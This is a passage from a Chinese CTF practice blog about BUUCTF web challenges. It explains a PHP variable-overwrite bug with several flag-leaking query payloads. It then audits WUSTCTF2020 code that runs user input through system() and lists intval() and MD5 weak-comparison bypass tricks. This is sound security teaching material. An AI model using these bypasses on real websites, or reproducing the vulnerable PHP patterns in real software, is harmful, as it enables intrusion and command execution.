class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $$使用不当造成变量覆盖漏洞</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 比如输入 yds=flag 相当于 $yds=$flag</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123; <span class="comment">//判断get传进来的值等不等于flag，如果等于flag则跳过</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当既没有通过GET方法传递flag参数，也没有通过POST方法传递flag参数时，会输出$yds。</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只要通过POST或者GET方法传递了名为flag的参数，并且该参数的值等于 &#x27;flag&#x27;，就会输出$is。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>到这里可以感觉到有好几个方法能够获取 flag</p>
<p><strong>第一种：</strong> yds=flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);		<span class="comment">//exit()也是可以输出的！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用这段代码结合变量覆盖漏洞，把 <code>$yds</code>  和 <code>$flag</code>  两个变量联系起来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们执行 get 传参的时候让 yds=flag，传进来之后通过 foreach 函数使 <code>$x=yds</code> ， <code>$y=flag</code> ，然后 <code>$$x = $$y</code>  会导致变量覆盖，可以这样理解 <code>$($x)=$($y)  $x=yds  $y=flag</code>  即 <code>$yds=$flag</code> ，至此我们可以构建一个巨简短的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b21.png" alt></p>
<p>网站最底部轻松找到 flag</p>
<p><strong>第二种：</strong> handsome=flag + 满足 if 条件</p>
<p>通过这段代码，实现让 handsome 和 yds 一样变量覆盖，然后满足 if 条件就好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>满足 if 条件需要 <code>flag=a&amp;a=flag</code> ，因为 GET 方法获取参数 flag，所以是 a，在第二次遍历的时候参数 <code>$x=a</code> ，所以会有 <code>a === a &amp;&amp; a != 'flag'</code>  满足条件，输出 <code>$handsome</code> ，所以我们还需要让变量 handsome 等于变量 flag，利用变量覆盖漏洞，只需要让第一种方法的那一段代码执行后得到 <code>$handsome = $flag</code>  就好，构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=a&amp;a=flag</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b22.png" alt></p>
<p>这里还有更简便的一种 payload，看别的师傅的 wp 看到的，贴个 wp：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Nestar/p/15922456.html">https://www.cnblogs.com/Nestar/p/15922456.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b23.png" alt></p>
<p>tql</p>
<p><strong>第三种：</strong> 覆盖 is</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码就简单的不能在简单了，很好执行，只需要满足 GET 方法得到的 flag 参数等于’flag’，然后我们利用上面的变量覆盖让 <code>$is=$flag</code>  就输出 flag 了</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b24.png" alt></p>
<h2 id="wustctf2020朴实无华"><a class="markdownIt-Anchor" href="#wustctf2020朴实无华">#</a> [WUSTCTF2020] 朴实无华</h2>
<p>进入页面，乱码，火狐右击定制工具栏，里面有个修复文字编码，看到人间极乐 bot？</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b27.png" alt></p>
<p>看到 bot 就想到 robots，尝试访问一下 robots.txt，好嘛确实有东西，不过一眼假。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b28.png" alt></p>
<p>没办法也没别的东西只能访问看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b29.png" alt></p>
<p>额。。。但是在查看 header 的时候有意外发现</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b30.png" alt></p>
<p>响应头里有个 <code>Look_at_me: /fl4g.php</code>  访问一下</p>
<p>这大图这乱码。。。文字修复一下得到代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>代码审计：</p>
<p>level1 是绕过 intval 函数</p>
<p>level2 是 md5 弱类型比较</p>
<p>level3 首先是 <code>strstr</code>  函数对空格的限制，传入的时候就不能有空格，然后是 <code>str_ireplace</code>  函数把 cat 替换成 wctf2020，然后传入的 get_flag 会被 <code>system</code>  当作系统命令执行</p>
<p>ok 一层一层来吧，先来 level1</p>
<p>这里记录一下 intval 函数和绕过方法，学习链接 https://blog.csdn.net/wangyuxiang946/article/details/131156104</p>
<p><code>intval()</code>  函数可以获取变量的<strong>整数值</strong>。常用于强制类型转换。</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int intval( $var, $base )</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<ul>
<li>$var：需要转换成 integer 的<strong>变量</strong></li>
<li>$base：转换所使用的<strong>进制</strong></li>
</ul>
<p>integer 是集合 ℤ = {…, -2, -1, 0, 1, 2, …} 中的某个数。</p>
<p>返回值：</p>
<p>返回值为 integer 型，可能是 0 或者 1 或者其他</p>
<ul>
<li>0：失败或者空 array 返回 0</li>
<li>1：非空 array 返回 1</li>
<li>其他 integer 值：成功返回 <code>$var</code>  的 integer 值。</li>
</ul>
<p>返回值的<strong>最大值</strong>取决于系统</p>
<ul>
<li>32 位系统（-2147483648 到 2147483647）</li>
<li>64 位系统（-9223372036854775808 到 9223372036854775807）</li>
</ul>
<p>有几个有用的功能介绍一下吧：</p>
<p>1、进制自动转换</p>
<p>第二个参数 $base 允许为空。</p>
<p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p>
<ul>
<li>如果 $var 以 0 开头，就使用 8 进制</li>
<li>如果 $var 以 0x 开头，就使用 16 进制</li>
<li>其他就使用 10 进制</li>
</ul>
<p>2、转换小数</p>
<p>intval () 转换小数类型时，只返回个位数，不遵循四舍五入的原则。</p>
<p>3、取反～</p>
<p>intval () 函数支持一些<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7&amp;spm=1001.2101.3001.7020">特殊符号</a>的，比如 <code>~</code>  取反。</p>
<p><strong>实例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~<span class="number">10</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~~<span class="number">10</span>));</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(-11)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure>
<p>绕过思路：当某个数字被过滤时，可以两次取反来绕过。</p>
<blockquote>
<p>intval () 绕过思路（与本题无关为了拓展记录）</p>
<p>1）当某个数字被过滤时，可以使用它的 8 进制 / 16 进制来绕过；比如过滤 10，就用 012（八进制）或 0xA（十六进制）。</p>
<p>2）对于弱比较（a==b），可以给 a、b 两个参数传入空数组，使弱比较为 true。</p>
<p>3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤 3，就用 3.1。</p>
<p>4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤 3，就用 3ab。（GET 请求的参数会自动拼接单引号）</p>
<p>5）当某个数字被过滤时，可以两次取反来绕过；比如过滤 10，就用～～10。</p>
<p>6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤 10，就用 5+5 或 2*5。</p>
</blockquote>
<p>学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44879989/article/details/133418606">https://blog.csdn.net/qq_44879989/article/details/133418606</a></p>
<p>本题 intval 的绕过和<strong>科学计数法</strong>息息相关，这里直接实例来看看 intval 函数遇到科学计数法会怎么样，但是 intval () 在不同 PHP 版本中表现是有差异的，在 <code>PHP7.4.3</code>  中的表现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;3.1415926e5&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;8724e-2&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b31.png" alt></p>
<p>从结果来看，是可以正常解读科学计数法的，那我切换成 <code>PHP5.3.29</code>  尝试一下，同样的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(intval(&#x27;1e10&#x27;));</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">var_dump(intval(&#x27;3.1415926e5&#x27;));</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">var_dump(intval(&#x27;8724e-2&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b32.png" alt></p>
<p>出现异常</p>
<p>经过查询发现 <code>intval()</code>  在  <code>PHP7.2.5 及以上版本</code>  中的表现符合预期，与我们对科学计数法的认知相符。  <code>PHP7.2.5 以下的某个版本以前</code> 表现异常，在 <code>PHP7.2.5 以下的某个版本</code>  以前， <code>intval()</code>  函数无法正确解析字符  <code>E</code>  或  <code>e</code> ，于是  <code>intval</code>  在解析到  <code>E</code>  或  <code>e</code>  时立即停止，这导致科学计数法实际并未生效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(intval(&#x27;1E2&#x27;));</span><br><span class="line">var_dump(intval(1E2));</span><br><span class="line"></span><br><span class="line">var_dump(intval(&#x27;3.688e2&#x27;));</span><br><span class="line">var_dump(intval(3.688e2));</span><br><span class="line"></span><br><span class="line">var_dump(intval(&#x27;9999E-3&#x27;));</span><br><span class="line">var_dump(intval(9999E-3));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>执行效果</p>
<p>int(1)<br>
int(100)<br>
int(3)<br>
int(368)<br>
int(9999)<br>
int(9)</p>
<p>回到题目，本题的 intval 就是利用这个来尝试绕过，因为 GET 传入的类型为 string，所以会导致 intval 函数内传入的值带上了单引号，就利用上了 intval 的漏洞，本地复现一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">gettype</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b34.png" alt></p>
